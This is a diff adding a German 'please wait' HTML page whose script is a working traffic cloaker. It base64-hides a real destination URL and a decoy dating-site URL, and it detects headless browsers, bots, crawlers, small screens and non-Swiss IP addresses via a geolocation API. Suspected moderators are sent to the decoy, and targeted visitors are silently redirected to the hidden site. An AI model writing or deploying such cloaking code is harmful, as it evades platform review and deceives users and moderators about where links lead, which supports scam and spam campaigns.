@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bitte warten...</title>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    const realURL = "aHR0cHM6Ly9zbmFwZ2lybHM3LmNvbS8/dXRtX3NvdXJjZT02bVRqOG9OdDF2dnVF";
+    const fakeURL = "aHR0cHM6Ly93d3cuZGF0aW5nLWRldXRzY2guZGUvZW4=";
+
+    const ua = navigator.userAgent.toLowerCase();
+    const isHeadless = navigator.webdriver;
+    const isBot = /bot|crawl|spider|google|bing|yahoo|facebook|twitter|crawler|curl|wget/i.test(ua);
+    const screenCheck = screen.width < 400 || screen.height < 300;
+
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const country = data.country_code;
+        const isMod = isHeadless || isBot || screenCheck || country !== "CH";
+
+        const target = atob(isMod ? fakeURL : realURL);
+        setTimeout(() => {
+          location.replace(target);
+        }, 3000);
+      })
+      .catch(() => {
+        // Якщо API не працює — перенаправити на фейковий сайт
+        location.replace(atob(fakeURL));
+      });
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      margin-top: 100px;
+      color: #333;
+    }
+    h1 { font-size: 2em; margin-bottom: 20px; }
+    p { font-size: 1.2em; }
+  </style>
+</head>
+<body>
+  <h1>Bitte warten...</h1>
+  <p>Sie werden gleich weitergeleitet...</p>
+</body>
+</html>
